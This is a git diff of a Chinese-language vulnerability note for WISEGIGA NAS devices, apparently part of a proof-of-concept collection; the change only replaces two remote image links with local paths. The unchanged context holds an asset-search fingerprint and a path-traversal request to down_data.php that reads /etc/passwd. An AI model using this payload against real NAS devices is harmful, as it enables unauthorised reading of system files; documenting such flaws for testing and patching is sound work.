@@ -22,7 +22,7 @@ app="WISEGIGA-NAS"
 
 主页面
 
-![image-20220628113649787](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202206281136917.png)
+![image-20220628113649787](./images/202206281136917.png)
 
 验证POC
 
@@ -30,4 +30,4 @@ app="WISEGIGA-NAS"
 /down_data.php?filename=../../../../../../../../../../../../../../etc/passwd
 ```
 
-![image-20220628113749412](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202206281137504.png)
+![image-20220628113749412](./images/202206281137504.png)
